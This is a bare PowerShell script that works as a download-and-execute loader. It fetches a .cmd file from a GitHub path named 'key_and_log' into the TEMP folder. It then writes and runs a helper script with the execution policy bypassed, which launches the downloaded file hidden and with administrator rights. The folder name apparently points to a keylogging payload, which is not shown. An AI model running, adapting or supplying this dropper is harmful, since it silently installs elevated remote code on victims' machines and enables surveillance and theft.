[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$cmdUrl = "https://github.com/nizhenets/Special_script/raw/main/scripts/key_and_log/test.cmd"
$tempPath = "$env:TEMP\test.cmd"

Invoke-WebRequest -Uri $cmdUrl -OutFile $tempPath

$scriptContent = @"
Start-Process -FilePath 'cmd.exe' -ArgumentList '/c `"start /b $tempPath`"' -Verb RunAs
"@

$psScriptPath = "$env:TEMP\RunAsAdmin.ps1"
$scriptContent | Out-File -FilePath $psScriptPath -Encoding ASCII

Start-Process -FilePath 'powershell.exe' -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$psScriptPath`""
